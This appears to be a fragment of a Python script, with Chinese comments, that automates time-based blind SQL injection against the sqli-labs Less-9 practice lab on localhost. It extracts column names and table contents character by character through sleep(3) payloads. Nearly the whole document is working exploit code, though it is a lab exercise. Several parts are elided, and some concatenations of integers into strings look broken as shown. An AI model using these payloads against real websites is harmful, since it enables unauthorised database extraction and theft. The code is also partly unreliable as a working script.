...
for d in range(0,lenth_table):
	wyw = real_table_name[d]#选择表名
	column_name2 = []#创建存储一个表下的全部列名的临时列表
	print(wyw+"'s column is:")
	for a in range(0,10):
		...
		for b in range(1,10):
			for c in range(32,128):
				...
				c=str(c)
				star_time = time.time()
				urltest="http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='"+wyw+"' limit "+a+",1),"+b+",1))="+c+",sleep(3),1)%23"
				requests.get(urltest)
				if (time.time() - star_time) > 3:
					string_1=chr(int(c))
...
for d in range(0,lenth_table):
	wyw = len(real_column_name[d])
	myy = real_table_name[d]
	for a in range(0,wyw):
		...
		for b in range(0,10):
			...
			for c in range(1,15):
				for h in range(32,128):
					...
					h = str(h)
					star_time = time.time()
					urltest="http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select "+queries+" from "+myy+" limit "+b+",1),"+c+",1))="+h+",sleep(3),1)%23"
					requests.get(urltest)
					if (time.time() - star_time) > 3:
						string_1=chr(int(h))
				...
				if h==str(127):
					break		
			if data_content:
				sentence = "The details of "+myy+"'s "+queries+" is:"
				print(sentence)
